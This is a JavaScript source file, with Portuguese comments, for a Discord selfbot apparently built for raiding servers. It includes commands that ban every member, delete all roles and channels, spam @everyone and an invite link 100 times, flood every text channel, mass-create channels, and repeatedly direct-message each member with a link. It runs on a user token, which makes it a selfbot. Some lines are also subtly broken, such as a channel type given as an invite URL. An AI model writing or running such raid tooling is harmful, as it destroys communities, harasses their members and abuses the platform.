const Discord = require("discord.js");
const config = require('./config.json');
const figlet = require('figlet');
const moment = require('moment');
const { red, green, blue, yellow, cyan } = require('chalk');
const bot = new Discord.Client();
const fs = require('fs')
const axios = require('axios')
const fetch = require('node-fetch')


//Configurações do bot
var token = config.token
var prefix = config.prefix
var nome = config.mensg
var sts = config.status
var url = config.url

//Painel
console.log(red(figlet.textSync('          Xandao     ')));
console.log(red('=============================================================================='));


//Mensagem quando o selfbot estiver online!
bot.on('ready', () => {
   console.log(green(`      Conectado por: ${bot.user.tag} | Prefix: ${prefix}     `));
   console.log(blue("              [π]        Feito por:  aktsu         [π]"))
  
  
}); 
  
//Logs Comandos 
bot.on('message', async (msg) => {

    if(msg.author.id !== config.ID) {

        return;

    }

    let cmd = msg.content.split(" ")[0]

    cmd = cmd.slice(config.prefix.length);

    let args = msg.content.split(" ").slice(1);

    if(msg.content.startsWith(config.prefix) && msg.author.id === config.ID) {

        console.log(cyan(`[COMANDO FEITO] :: ${msg.content}`));
      
      }
  
  //Comandos
     if (cmd == "ban") {
       msg.delete()
       msg.guild.members.tap(member => member.ban(config.ban));
       
     } else if (cmd == config.gatilho) {
      msg.delete()
     msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
     
   } else if (cmd == "spam") {
      msg.delete();

    for (pas = 0; pas < 100; pas++) {

      msg.channel.sendMessage("@everyone akatsu passou por aqui discord.gg/dellux \n" + config.link);

}

console.log(green("[+]"  +  "Spam ativado 🤡"));




    } else if (cmd == "st") {
       msg.delete()
       bot.user.setPresence({
         game: {
            name: sts,
            type: "STREAMING",
            url: url
        }

    })
      } else if (cmd == "unban") {
     msg.delete()
         msg.guild.fetchBans().then(bans => {

      bans.forEach(membro => {

        console.log(green('[+]' + "Um membro desbanindo:" + membro.username + "#" + membro.tag));
          
         });
      }); 
       } else if (cmd == "all") {
           msg.delete()
           var mensagem = msg.content.slice(8);

    for (pas = 0; pas < 100; pas++) {

      msg.guild.channels

        .filter(channel => channel.type == "text")

        .forEach(channel => {

          channel.send(mensagem).catch(error => {});

        }, 450);
       }
      } else if (cmd == "1") {
    msg.delete();
     console.log(green("[+]"  +  `Um canal foi criado: ${nome}`))
     for (pas = 0; pas < 100; pas++) {
        
   msg.guild.createChannel(nome, "voice");
       }
      } else if (cmd == "2") {
        msg.delete();
        console.log(green("[+]"  +  `Um canal foi criado: ${nome}`))
        for (pas = 0; pas < 100; pas++) {
          
          msg.guild.createChannel(nome, "discord.gg/dellux");
        }
       } else if (cmd == "div") {
            msg.delete();

    for (pas = 0; pas < 100; pas++) {

      if (msg.channel.type === "dm") return;

      msg.guild.members.forEach(member => {

        setInterval(function() {

          member.send(`Olá\n${config.link}`).catch(error => {});

        }, 450);
       })
      
      };
     } else if (cmd == "nuke") {
          msg.delete()
       msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();

    msg.guild.channels.deleteAll();
       msg.guild.members.map(membro => 
               membro.ban(config.ban))
                  .catch(error => {
                console.log(yellow("[-]"  +  ":: Não consegui banir uns dos membros, eles tem cargos maiores que você"));
         
 });
     console.log(green("[+]"  +  ":: Um membro Foi banido!"));
       
//Controle de Error
bot.on("error", (e) => 
   console.error(e))
        
    }
   
 });

bot.login(token);
